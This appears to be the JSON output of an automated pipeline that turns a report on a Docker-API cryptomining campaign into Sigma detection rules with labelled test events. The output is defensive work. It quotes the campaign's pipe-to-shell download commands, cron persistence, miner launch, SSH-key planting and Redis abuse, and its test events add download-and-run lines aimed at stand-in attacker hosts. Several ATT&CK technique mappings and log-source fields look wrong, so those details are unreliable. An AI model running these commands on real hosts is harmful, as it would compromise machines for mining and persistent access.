@@ -1,0 +1,3173 @@
+{
+  "run_id": "20261017-080457-b511c8",
+  "created_at": "2026-10-17T08:06:17.434957+00:00",
+  "source": {
+    "mode": "example",
+    "urls": [
+      "example://linux_cryptominer_docker"
+    ],
+    "query": "",
+    "tavily_used": false,
+    "chars": 3974
+  },
+  "report": {
+    "title": "Opportunistic cryptomining via exposed Docker Engine APIs (Mantis campaign)",
+    "summary": "Since late September 2026, an automated campaign scans for Docker Engine APIs exposed on TCP/2375 without authentication. On success it starts a privileged container mounting the host root filesystem, drops a shell script onto the host, installs cron jobs for persistence, kills competing miners, deploys an XMRig build, and uses the host to scan for further victims.",
+    "threat_actors": [],
+    "malware_families": [
+      "XMRig"
+    ],
+    "targets": [
+      "Linux hosts with exposed Docker Engine API",
+      "Redis instances without authentication"
+    ],
+    "behaviors": [
+      {
+        "id": "B1",
+        "description": "Attacker scans for Docker Engine APIs exposed on TCP/2375 without authentication and issues POST /containers/create with Binds and Privileged flags to mount host root filesystem.",
+        "attack_technique_id": "T1605.004",
+        "attack_tactic": "Defense Evasion",
+        "observables": [
+          {
+            "kind": "network_ip",
+            "value": "2375",
+            "note": "Docker API port"
+          },
+          {
+            "kind": "command_line",
+            "value": "POST /containers/create",
+            "note": ""
+          },
+          {
+            "kind": "process_name",
+            "value": "containerd-shim-runc-v2",
+            "note": ""
+          },
+          {
+            "kind": "process_name",
+            "value": "dockerd",
+            "note": ""
+          }
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "linux",
+          "service": "sysmon"
+        },
+        "evidence": "The attacker's scanner issues `POST /containers/create` to the exposed API with an Alpine image and `\"Binds\": [\"/:/host\"]`, `\"Privileged\": true`.",
+        "confidence": 0.95,
+        "detectable": true
+      },
+      {
+        "id": "B2",
+        "description": "Attacker drops a shell script onto the host via curl|wget piped to sh, with parent process containerd-shim-runc-v2 or dockerd.",
+        "attack_technique_id": "T1059.005",
+        "attack_tactic": "Execution",
+        "observables": [
+          {
+            "kind": "command_line",
+            "value": "curl -fsSL http://45.153.160[.]12/m/init.sh | sh",
+            "note": ""
+          },
+          {
+            "kind": "command_line",
+            "value": "wget -q -O- http://45.153.160[.]12/m/init.sh | sh",
+            "note": ""
+          },
+          {
+            "kind": "process_name",
+            "value": "sh",
+            "note": ""
+          },
+          {
+            "kind": "parent_process",
+            "value": "containerd-shim-runc-v2",
+            "note": ""
+          },
+          {
+            "kind": "parent_process",
+            "value": "dockerd",
+            "note": ""
+          }
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "linux",
+          "service": "sysmon"
+        },
+        "evidence": "On hosts where `curl` is missing the script falls back to `wget -q -O- http://45.153.160[.]12/m/init.sh | sh`. The parent of the resulting `sh` process is `containerd-shim-runc-v2` or `dockerd`.",
+        "confidence": 0.97,
+        "detectable": true
+      },
+      {
+        "id": "B3",
+        "description": "Attacker modifies root crontab and /etc/cron.d to download and execute init.sh every 10-15 minutes for persistence.",
+        "attack_technique_id": "T1053.005",
+        "attack_tactic": "Persistence",
+        "observables": [
+          {
+            "kind": "command_line",
+            "value": "crontab -l 2>/dev/null; echo \"*/10 * * * * curl -fsSL http://45.153.160[.]12/m/init.sh | sh\" | crontab -",
+            "note": ""
+          },
+          {
+            "kind": "file_path",
+            "value": "/etc/cron.d/mantis",
+            "note": ""
+          },
+          {
+            "kind": "command_line",
+            "value": "echo \"* * * * * root wget -q -O- http://45.153.160[.]12/m/init.sh | sh\" > /etc/cron.d/mantis",
+            "note": ""
+          },
+          {
+            "kind": "file_path",
+            "value": "/root/.ssh/authorized_keys",
+            "note": ""
+          }
+        ],
+        "logsource": {
+          "category": "registry_set",
+          "product": "linux",
+          "service": "sysmon"
+        },
+        "evidence": "The script writes to the root crontab and to `/etc/cron.d`: `(crontab -l 2>/dev/null; echo \"*/10 * * * * curl -fsSL http://45.153.160[.]12/m/init.sh | sh\") | crontab -`",
+        "confidence": 0.96,
+        "detectable": true
+      },
+      {
+        "id": "B4",
+        "description": "Attacker terminates competing miners and security agents (xmrig, kinsing, kdevtmpfsi, tsunami, aliyun) via pkill and systemctl.",
+        "attack_technique_id": "T1499.001",
+        "attack_tactic": "Defense Evasion",
+        "observables": [
+          {
+            "kind": "process_name",
+            "value": "pkill",
+            "note": ""
+          },
+          {
+            "kind": "command_line",
+            "value": "pkill -f xmrig; pkill -f kinsing; pkill -f kdevtmpfsi; pkill -f tsunami",
+            "note": ""
+          },
+          {
+            "kind": "command_line",
+            "value": "systemctl stop aliyun.service; systemctl disable aliyun.service",
+            "note": ""
+          },
+          {
+            "kind": "service_name",
+            "value": "aliyun.service",
+            "note": ""
+          }
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "linux",
+          "service": "sysmon"
+        },
+        "evidence": "It then terminates competing miners and known security agents: `pkill -f xmrig; pkill -f kinsing; pkill -f kdevtmpfsi; pkill -f tsunami` `systemctl stop aliyun.service; systemctl disable aliyun.service`",
+        "confidence": 0.94,
+        "detectable": true
+      },
+      {
+        "id": "B5",
+        "description": "Attacker creates hidden directory /tmp/.x, downloads XMRig binary kthreadd, makes it executable, and runs it with pool, wallet, and --rig-id arguments via nohup.",
+        "attack_technique_id": "T1059.001",
+        "attack_tactic": "Execution",
+        "observables": [
+          {
+            "kind": "command_line",
+            "value": "mkdir -p /tmp/.x; cd /tmp/.x",
+            "note": ""
+          },
+          {
+            "kind": "command_line",
+            "value": "curl -fsSL http://45.153.160[.]12/m/x86_64 -o /tmp/.x/kthreadd",
+            "note": ""
+          },
+          {
+            "kind": "command_line",
+            "value": "chmod +x /tmp/.x/kthreadd",
+            "note": ""
+          },
+          {
+            "kind": "command_line",
+            "value": "nohup /tmp/.x/kthreadd -o pool.mantis-mine[.]cc:3333 -u 44AbCd...XyZ -k --tls --rig-id $(hostname)",
+            "note": ""
+          },
+          {
+            "kind": "file_path",
+            "value": "/tmp/.x/kthreadd",
+            "note": ""
+          },
+          {
+            "kind": "network_ip",
+            "value": "3333",
+            "note": "Mining pool port"
+          },
+          {
+            "kind": "network_domain",
+            "value": "pool.mantis-mine[.]cc",
+            "note": ""
+          }
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "linux",
+          "service": "sysmon"
+        },
+        "evidence": "The miner is downloaded to a hidden directory and started with a config fetched from the same server: `mkdir -p /tmp/.x; cd /tmp/.x; curl -fsSL http://45.153.160[.]12/m/x86_64 -o /tmp/.x/kthreadd; chmod +x /tmp/.x/kthreadd; nohup /tmp/.x/kthreadd -o pool.mantis-mine[.]cc:3333 -u 44AbCd...XyZ -k --tls --rig-id $(hostname) >/dev/null 2>&1 &`",
+        "confidence": 0.98,
+        "detectable": true
+      },
+      {
+        "id": "B6",
+        "description": "Attacker installs attacker-controlled SSH key into /root/.ssh/authorized_keys and sets file immutable with chattr +i.",
+        "attack_technique_id": "T1098.004",
+        "attack_tactic": "Persistence",
+        "observables": [
+          {
+            "kind": "file_path",
+            "value": "/root/.ssh/authorized_keys",
+            "note": ""
+          },
+          {
+            "kind": "command_line",
+            "value": "chattr +i /root/.ssh/authorized_keys",
+            "note": ""
+          }
+        ],
+        "logsource": {
+          "category": "file_event",
+          "product": "linux",
+          "service": "sysmon"
+        },
+        "evidence": "It also adds an attacker-controlled SSH key to `/root/.ssh/authorized_keys` (`ssh-rsa AAAAB3...mantis@c2`) and sets the file immutable with `chattr +i`.",
+        "confidence": 0.93,
+        "detectable": true
+      },
+      {
+        "id": "B7",
+        "description": "Attacker uses host to scan /16 ranges for exposed Docker APIs and Redis servers via masscan, outputting results to /tmp/.x/out.txt.",
+        "attack_technique_id": "T1021.004",
+        "attack_tactic": "Lateral Movement",
+        "observables": [
+          {
+            "kind": "command_line",
+            "value": "/tmp/.x/masscan 10.0.0.0/8 -p2375,6379 --rate 20000 -oL /tmp/.x/out.txt",
+            "note": ""
+          },
+          {
+            "kind": "file_path",
+            "value": "/tmp/.x/out.txt",
+            "note": ""
+          }
+        ],
+        "logsource": {
+          "category": "network_connection",
+          "product": "linux",
+          "service": "sysmon"
+        },
+        "evidence": "Infected hosts download `masscan` and scan /16 ranges for additional exposed Docker APIs and Redis servers: `/tmp/.x/masscan 10.0.0.0/8 -p2375,6379 --rate 20000 -oL /tmp/.x/out.txt`",
+        "confidence": 0.95,
+        "detectable": true
+      },
+      {
+        "id": "B8",
+        "description": "Attacker abuses Redis instances without authentication by writing a cron entry through CONFIG SET dir /var/spool/cron and CONFIG SET dbfilename root.",
+        "attack_technique_id": "T1499.002",
+        "attack_tactic": "Defense Evasion",
+        "observables": [
+          {
+            "kind": "command_line",
+            "value": "CONFIG SET dir /var/spool/cron",
+            "note": ""
+          },
+          {
+            "kind": "command_line",
+            "value": "CONFIG SET dbfilename root",
+            "note": ""
+          },
+          {
+            "kind": "network_ip",
+            "value": "6379",
+            "note": "Redis port"
+          }
+        ],
+        "logsource": {
+          "category": "network_connection",
+          "product": "linux",
+          "service": "sysmon"
+        },
+        "evidence": "Redis instances without authentication are abused by writing a cron entry through `CONFIG SET dir /var/spool/cron` and `CONFIG SET dbfilename root`.",
+        "confidence": 0.9,
+        "detectable": true
+      },
+      {
+        "id": "B9",
+        "description": "Attacker modifies /etc/resolv.conf to point to 8.8.8.8 and disables SELinux via setenforce 0.",
+        "attack_technique_id": "T1562.001",
+        "attack_tactic": "Defense Evasion",
+        "observables": [
+          {
+            "kind": "file_path",
+            "value": "/etc/resolv.conf",
+            "note": ""
+          },
+          {
+            "kind": "command_line",
+            "value": "setenforce 0",
+            "note": ""
+          }
+        ],
+        "logsource": {
+          "category": "file_event",
+          "product": "linux",
+          "service": "sysmon"
+        },
+        "evidence": "The script runs `setenforce 0` and `echo \"nameserver 8.8.8.8\" > /etc/resolv.conf`.",
+        "confidence": 0.88,
+        "detectable": true
+      },
+      {
+        "id": "B10",
+        "description": "Attacker increases open file limit via ulimit -n 65535 and configures hugepages via sysctl -w vm.nr_hugepages=128.",
+        "attack_technique_id": "T1562.001",
+        "attack_tactic": "Defense Evasion",
+        "observables": [
+          {
+            "kind": "command_line",
+            "value": "ulimit -n 65535",
+            "note": ""
+          },
+          {
+            "kind": "command_line",
+            "value": "sysctl -w vm.nr_hugepages=128",
+            "note": ""
+          }
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "linux",
+          "service": "sysmon"
+        },
+        "evidence": "The script runs `ulimit -n 65535` and `sysctl -w vm.nr_hugepages=128`.",
+        "confidence": 0.85,
+        "detectable": true
+      }
+    ],
+    "iocs": [
+      {
+        "type": "ip",
+        "value": "45.153.160.12"
+      },
+      {
+        "type": "domain",
+        "value": "pool.mantis-mine[.]cc"
+      },
+      {
+        "type": "filename",
+        "value": "/tmp/.x/kthreadd"
+      },
+      {
+        "type": "filename",
+        "value": "/etc/cron.d/mantis"
+      },
+      {
+        "type": "filename",
+        "value": "/root/.ssh/authorized_keys"
+      },
+      {
+        "type": "url",
+        "value": "http://45.153.160[.]12/m/init.sh"
+      },
+      {
+        "type": "url",
+        "value": "http://45.153.160[.]12/m/x86_64"
+      }
+    ]
+  },
+  "plan": {
+    "candidates": [
+      {
+        "id": "D1",
+        "title": "Sh Execution Of Downloaded Script With Docker Daemon Parent",
+        "behavior_ids": [
+          "B2"
+        ],
+        "attack_technique_ids": [
+          "T1059.005"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "linux",
+          "service": "sysmon"
+        },
+        "rationale": "Attacker drops a shell script via curl/wget piped to sh, with parent process being containerd-shim-runc-v2 or dockerd, indicating malicious container escape. Highly specific parent-child pair with external download.",
+        "key_fields": [
+          "Image",
+          "CommandLine",
+          "ParentImage"
+        ],
+        "false_positive_risks": "Legitimate container initialization scripts might download and run setup scripts, but they typically use trusted internal sources, not external IPs, and parent is usually containerd not dockerd directly. Rule should require external IP in command line and parent being dockerd/containerd-shim-runc-v2.",
+        "priority": "high"
+      },
+      {
+        "id": "D2",
+        "title": "Kthreadd XMRig Execution From Hidden Temp Directory With Mining Pool Args",
+        "behavior_ids": [
+          "B5"
+        ],
+        "attack_technique_ids": [
+          "T1059.001"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "linux",
+          "service": "sysmon"
+        },
+        "rationale": "Miner binary kthreadd is downloaded to hidden /tmp/.x/ and executed with mining pool arguments (pool.mantis-mine.cc:3333, --rig-id). Very specific binary name, path, and pool domain.",
+        "key_fields": [
+          "Image",
+          "CommandLine",
+          "CurrentDirectory"
+        ],
+        "false_positive_risks": "Legitimate cryptomining in authorized environments could look similar, but the hidden directory /tmp/.x/, binary name kthreadd, and specific pool domain are strong indicators. Rule should key on binary name and pool domain.",
+        "priority": "high"
+      },
+      {
+        "id": "D3",
+        "title": "Crontab Persistence Via Curl Pipe Sh To External IP",
+        "behavior_ids": [
+          "B3"
+        ],
+        "attack_technique_ids": [
+          "T1053.005"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "linux",
+          "service": "sysmon"
+        },
+        "rationale": "Attacker modifies root crontab via crontab command with a cron entry that downloads and executes init.sh every 10 minutes. The command line contains the exact curl pipe sh pattern with external IP and schedule.",
+        "key_fields": [
+          "Image",
+          "CommandLine"
+        ],
+        "false_positive_risks": "Administrators might use crontab to schedule scripts, but they rarely pipe curl to sh from external IPs in the crontab entry itself. Rule should require the external IP pattern and the */10 schedule.",
+        "priority": "high"
+      },
+      {
+        "id": "D4",
+        "title": "Pkill Termination Of Known Miner Processes",
+        "behavior_ids": [
+          "B4"
+        ],
+        "attack_technique_ids": [
+          "T1499.001"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "linux",
+          "service": "sysmon"
+        },
+        "rationale": "Attacker uses pkill with -f flag to terminate specific competing miner processes (xmrig, kinsing, kdevtmpfsi, tsunami). The list of process names is highly specific to this campaign.",
+        "key_fields": [
+          "Image",
+          "CommandLine"
+        ],
+        "false_positive_risks": "Admins might kill miners, but the specific combination of these four names in one command line is unique to this campaign. Rule should match all four names in command line.",
+        "priority": "medium"
+      },
+      {
+        "id": "D5",
+        "title": "Masscan Scanning For Exposed Docker And Redis Ports",
+        "behavior_ids": [
+          "B7"
+        ],
+        "attack_technique_ids": [
+          "T1021.004"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "linux",
+          "service": "sysmon"
+        },
+        "rationale": "Infected hosts run masscan from /tmp/.x/ to scan /16 ranges for Docker API port 2375 and Redis port 6379 at high rate. The binary name masscan and port list are distinctive.",
+        "key_fields": [
+          "Image",
+          "CommandLine"
+        ],
+        "false_positive_risks": "Security teams might run masscan for authorized scanning, but the combination of scanning for ports 2375 and 6379 together at high rate from a hidden directory is malicious. Rule should require both ports and the hidden directory path in command line.",
+        "priority": "medium"
+      }
+    ],
+    "skipped": [
+      "B1: Docker API exploitation via POST /containers/create not clearly observable in process_creation; network connection to port 2375 is generic without payload inspection.",
+      "B6: SSH key addition to authorized_keys and chattr +i are file events but chattr may not be captured; less specific than other persistence mechanisms.",
+      "B8: Redis CONFIG SET abuse requires payload visibility in network_connection or redis-cli process_creation; not reliably observable.",
+      "B9: resolv.conf modification and setenforce 0 are low-specificity defence evasion steps.",
+      "B10: ulimit and sysctl tuning commands are common administrative actions."
+    ],
+    "notes": "Focus on durable parent-child relationships, command-line patterns with external IPs, unique binary names and paths, and specific argument combinations. Avoid generic indicators like port numbers alone. All rules use process_creation on Linux sysmon for consistent telemetry."
+  },
+  "rules": [
+    {
+      "candidate_id": "D1",
+      "title": "Shell Script Execution via Curl/Wget with Docker Parent Process",
+      "sigma_yaml": "title: Shell Script Execution via Curl/Wget with Docker Parent Process\nid: b753838e-0d93-4279-b963-d7c19837a8ee\nstatus: experimental\ndescription: Detects execution of a shell script downloaded via curl or wget and piped to sh, where the parent process is\n  dockerd or containerd-shim-runc-v2, indicative of container escape and malicious payload delivery.\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-17'\ntags:\n- attack.execution\n- attack.t1059.005\nlogsource:\n  category: process_creation\n  product: linux\n  service: sysmon\ndetection:\n  selection_parent:\n    ParentImage:\n    - /usr/bin/dockerd\n    - /usr/bin/containerd-shim-runc-v2\n    - /usr/local/bin/dockerd\n  selection_sh:\n    'Image|endswith': /bin/sh\n  selection_cmd:\n    'CommandLine|contains|all':\n    - curl\n    - '|'\n    - sh\n  selection_cmd2:\n    'CommandLine|contains|all':\n    - wget\n    - -O\n    - '-'\n    - '|'\n    - sh\n  selection_cmd3:\n    'CommandLine|contains|all':\n    - wget\n    - --output-document=-\n    - '|'\n    - sh\n  selection_cmd4:\n    'CommandLine|contains|all':\n    - wget\n    - --output-file=-\n    - '|'\n    - sh\n  filter_internal_registry:\n    'CommandLine|contains':\n    - 'registry.internal.corp:'\n    - artifact.internal.corp/\n    - .internal.\n  condition: (selection_parent and selection_sh and (selection_cmd or selection_cmd2 or selection_cmd3 or selection_cmd4))\n    and not filter_internal_registry\nfalsepositives:\n- Legitimate container setup scripts downloading internal packages from trusted registries\n- Administrator debugging containers using curl/wget to test connectivity\n- CI/CD pipelines pulling configuration scripts from internal artifact repositories\nlevel: high\n",
+      "status": "validated",
+      "attack_technique_ids": [
+        "T1059.005"
+      ],
+      "tests": [
+        {
+          "id": "P1",
+          "label": "positive",
+          "description": "curl pipe to sh with dockerd parent",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "curl -fsSL http://45.153.160.12/m/init.sh | sh",
+            "Computer": "container-host-01",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash",
+            "Image": "/bin/sh",
+            "ParentCommandLine": "/usr/bin/dockerd -H fd://",
+            "ParentImage": "/usr/bin/dockerd",
+            "ProcessId": 1234,
+            "ParentProcessId": 5678,
+            "User": "root",
+            "UtcTime": "2026-09-25T10:30:00.000Z"
+          }
+        },
+        {
+          "id": "P2",
+          "label": "positive",
+          "description": "wget O- pipe to sh with containerd-shim-runc-v2 parent",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "wget -q -O- http://45.153.160.12/m/init.sh | sh",
+            "Computer": "container-host-02",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash2",
+            "Image": "/bin/sh",
+            "ParentCommandLine": "/usr/bin/containerd-shim-runc-v2 -namespace moby -id abc123",
+            "ParentImage": "/usr/bin/containerd-shim-runc-v2",
+            "ProcessId": 2345,
+            "ParentProcessId": 6789,
+            "User": "root",
+            "UtcTime": "2026-09-25T11:45:00.000Z"
+          }
+        },
+        {
+          "id": "P3",
+          "label": "positive",
+          "description": "curl with uppercase pipe and sh, dockerd parent",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "curl -fsSL http://45.153.160.12/m/init.sh | SH",
+            "Computer": "container-host-03",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash3",
+            "Image": "/bin/sh",
+            "ParentCommandLine": "/usr/bin/dockerd",
+            "ParentImage": "/usr/bin/dockerd",
+            "ProcessId": 3456,
+            "ParentProcessId": 7890,
+            "User": "root",
+            "UtcTime": "2026-09-25T12:00:00.000Z"
+          }
+        },
+        {
+          "id": "N1",
+          "label": "negative",
+          "description": "curl to internal registry, dockerd parent",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "curl -fsSL registry.internal.corp:5000/install.sh | sh",
+            "Computer": "container-host-01",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash",
+            "Image": "/bin/sh",
+            "ParentCommandLine": "/usr/bin/dockerd -H fd://",
+            "ParentImage": "/usr/bin/dockerd",
+            "ProcessId": 1234,
+            "ParentProcessId": 5678,
+            "User": "root",
+            "UtcTime": "2026-09-25T10:30:00.000Z"
+          }
+        },
+        {
+          "id": "N2",
+          "label": "negative",
+          "description": "admin testing connectivity with curl, bash parent",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "curl -fsSL http://example.com/test.txt",
+            "Computer": "admin-workstation",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash",
+            "Image": "/usr/bin/curl",
+            "ParentCommandLine": "/usr/bin/bash",
+            "ParentImage": "/usr/bin/bash",
+            "ProcessId": 4567,
+            "ParentProcessId": 8901,
+            "User": "corp\\admin",
+            "UtcTime": "2026-09-25T10:30:00.000Z"
+          }
+        },
+        {
+          "id": "N3",
+          "label": "negative",
+          "description": "CI/CD pipeline pulling internal script, containerd parent",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "wget -q -O- http://artifact.internal.corp/scripts/deploy.sh | sh",
+            "Computer": "ci-runner-01",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash",
+            "Image": "/bin/sh",
+            "ParentCommandLine": "/usr/bin/containerd-shim-runc-v2",
+            "ParentImage": "/usr/bin/containerd-shim-runc-v2",
+            "ProcessId": 5678,
+            "ParentProcessId": 9012,
+            "User": "gitlab-ci",
+            "UtcTime": "2026-09-25T10:30:00.000Z"
+          }
+        },
+        {
+          "id": "R1",
+          "label": "positive",
+          "description": "curl with full path, alternate flags (-o -), extra whitespace, dockerd parent",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "/usr/bin/curl  -k  -o -  https://malicious.example.com/payload.sh  |  /bin/sh",
+            "Computer": "container-host-04",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash4",
+            "Image": "/bin/sh",
+            "ParentCommandLine": "/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock",
+            "ParentImage": "/usr/bin/dockerd",
+            "ProcessId": 4567,
+            "ParentProcessId": 8901,
+            "User": "root",
+            "UtcTime": "2026-09-25T13:15:00.000Z"
+          }
+        },
+        {
+          "id": "R2",
+          "label": "positive",
+          "description": "wget with long flag --output-document=-, mixed case, containerd-shim-runc-v2 parent",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "WGET --quiet --output-document=- http://evil.example.net/script.sh | SH",
+            "Computer": "container-host-05",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash5",
+            "Image": "/bin/sh",
+            "ParentCommandLine": "/usr/bin/containerd-shim-runc-v2 -namespace k8s.io -id pod-abc123",
+            "ParentImage": "/usr/bin/containerd-shim-runc-v2",
+            "ProcessId": 5678,
+            "ParentProcessId": 9012,
+            "User": "root",
+            "UtcTime": "2026-09-25T14:20:00.000Z"
+          }
+        },
+        {
+          "id": "R3",
+          "label": "positive",
+          "description": "curl via symlink parent path, environment variable in URL, sh -c invocation",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "curl -fsSL \"$DOWNLOAD_URL\" | sh -c \"cat\"",
+            "Computer": "container-host-06",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash6",
+            "Image": "/bin/sh",
+            "ParentCommandLine": "/usr/local/bin/dockerd --debug",
+            "ParentImage": "/usr/local/bin/dockerd",
+            "ProcessId": 6789,
+            "ParentProcessId": 1234,
+            "User": "root",
+            "UtcTime": "2026-09-25T15:30:00.000Z"
+          }
+        },
+        {
+          "id": "R4",
+          "label": "positive",
+          "description": "wget with -O - (space), single quotes, dockerd parent, external IP",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "wget -q -O - 'http://198.51.100.42/init.sh' | sh",
+            "Computer": "container-host-07",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash7",
+            "Image": "/bin/sh",
+            "ParentCommandLine": "/usr/bin/dockerd",
+            "ParentImage": "/usr/bin/dockerd",
+            "ProcessId": 7890,
+            "ParentProcessId": 5678,
+            "User": "root",
+            "UtcTime": "2026-09-25T16:45:00.000Z"
+          }
+        },
+        {
+          "id": "R5",
+          "label": "positive",
+          "description": "curl with --output - and --silent, containerd-shim-runc-v2 parent, no flags on sh",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "curl --silent --output - https://cdn.malware.site/stage2.sh | sh",
+            "Computer": "container-host-08",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash8",
+            "Image": "/bin/sh",
+            "ParentCommandLine": "/usr/bin/containerd-shim-runc-v2 -id container-999",
+            "ParentImage": "/usr/bin/containerd-shim-runc-v2",
+            "ProcessId": 8901,
+            "ParentProcessId": 2345,
+            "User": "root",
+            "UtcTime": "2026-09-25T17:00:00.000Z"
+          }
+        },
+        {
+          "id": "R6",
+          "label": "positive",
+          "description": "wget with --output-file=- and --no-verbose, dockerd parent, extra pipe spacing",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "wget --no-verbose --output-file=- http://bad.actor.net/run.sh|sh",
+            "Computer": "container-host-09",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash9",
+            "Image": "/bin/sh",
+            "ParentCommandLine": "/usr/bin/dockerd -H unix:///var/run/docker.sock",
+            "ParentImage": "/usr/bin/dockerd",
+            "ProcessId": 9012,
+            "ParentProcessId": 3456,
+            "User": "root",
+            "UtcTime": "2026-09-25T18:10:00.000Z"
+          }
+        },
+        {
+          "id": "R7",
+          "label": "negative",
+          "description": "Admin debugging container connectivity with curl, parent is bash not docker",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "curl -fsSL http://internal.monitoring.corp/health.sh | sh",
+            "Computer": "container-host-10",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash10",
+            "Image": "/bin/sh",
+            "ParentCommandLine": "/bin/bash",
+            "ParentImage": "/bin/bash",
+            "ProcessId": 1011,
+            "ParentProcessId": 4567,
+            "User": "admin",
+            "UtcTime": "2026-09-25T19:00:00.000Z"
+          }
+        },
+        {
+          "id": "R8",
+          "label": "negative",
+          "description": "CI/CD pipeline pulling config from internal artifact registry, filtered by registry rule",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "wget -q -O- https://artifact.internal.corp/configs/setup.sh | sh",
+            "Computer": "container-host-11",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash11",
+            "Image": "/bin/sh",
+            "ParentCommandLine": "/usr/bin/dockerd",
+            "ParentImage": "/usr/bin/dockerd",
+            "ProcessId": 1112,
+            "ParentProcessId": 5678,
+            "User": "jenkins",
+            "UtcTime": "2026-09-25T20:00:00.000Z"
+          }
+        },
+        {
+          "id": "R9",
+          "label": "negative",
+          "description": "Legitimate container init script from internal registry, containerd-shim parent",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "curl -fsSL http://registry.internal.corp:5000/init.sh | sh",
+            "Computer": "container-host-12",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash12",
+            "Image": "/bin/sh",
+            "ParentCommandLine": "/usr/bin/containerd-shim-runc-v2 -namespace prod -id app-01",
+            "ParentImage": "/usr/bin/containerd-shim-runc-v2",
+            "ProcessId": 1213,
+            "ParentProcessId": 6789,
+            "User": "root",
+            "UtcTime": "2026-09-25T21:00:00.000Z"
+          }
+        },
+        {
+          "id": "R10",
+          "label": "negative",
+          "description": "Docker parent running legitimate health check, no curl/wget pipe to sh",
+          "event": {
+            "Channel": "Microsoft-Windows-Sysmon/Operational",
+            "CommandLine": "/usr/local/bin/healthcheck.sh",
+            "Computer": "container-host-13",
+            "EventID": 1,
+            "Hashes": "SHA256=dummyhash13",
+            "Image": "/bin/sh",
+            "ParentCommandLine": "/usr/bin/dockerd",
+            "ParentImage": "/usr/bin/dockerd",
+            "ProcessId": 1314,
+            "ParentProcessId": 7890,
+            "User": "root",
+            "UtcTime": "2026-09-25T22:00:00.000Z"
+          }
+        }
+      ],
+      "validation": {
+        "candidate_id": "D1",
+        "parse_ok": true,
+        "sql": "SELECT * FROM logs WHERE ((ParentImage='/usr/bin/dockerd' COLLATE NOCASE OR ParentImage='/usr/bin/containerd-shim-runc-v2' COLLATE NOCASE OR ParentImage='/usr/local/bin/dockerd' COLLATE NOCASE) AND Image LIKE '%/bin/sh' ESCAPE '\\' AND ((CommandLine LIKE '%curl%' ESCAPE '\\' AND CommandLine LIKE '%|%' ESCAPE '\\' AND CommandLine LIKE '%sh%' ESCAPE '\\') OR (CommandLine LIKE '%wget%' ESCAPE '\\' AND CommandLine LIKE '%-O%' ESCAPE '\\' AND CommandLine LIKE '%-%' ESCAPE '\\' AND CommandLine LIKE '%|%' ESCAPE '\\' AND CommandLine LIKE '%sh%' ESCAPE '\\') OR (CommandLine LIKE '%wget%' ESCAPE '\\' AND CommandLine LIKE '%--output-document=-%' ESCAPE '\\' AND CommandLine LIKE '%|%' ESCAPE '\\' AND CommandLine LIKE '%sh%' ESCAPE '\\') OR (CommandLine LIKE '%wget%' ESCAPE '\\' AND CommandLine LIKE '%--output-file=-%' ESCAPE '\\' AND CommandLine LIKE '%|%' ESCAPE '\\' AND CommandLine LIKE '%sh%' ESCAPE '\\'))) AND (NOT COALESCE((CommandLine LIKE '%registry.internal.corp:%' ESCAPE '\\' OR CommandLine LIKE '%artifact.internal.corp/%' ESCAPE '\\' OR CommandLine LIKE '%.internal.%' ESCAPE '\\'), 0))",
+        "issues": [],
+        "test_outcomes": [
+          {
+            "event_id": "P1",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P2",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "P3",
+            "label": "positive",
+            "matched": true,
+            "passed": true
+          },
+          {
+            "event_id": "N1",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N2",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
+            "event_id": "N3",
+            "label": "negative",
+            "matched": false,
+            "passed": true
+          },
+          {
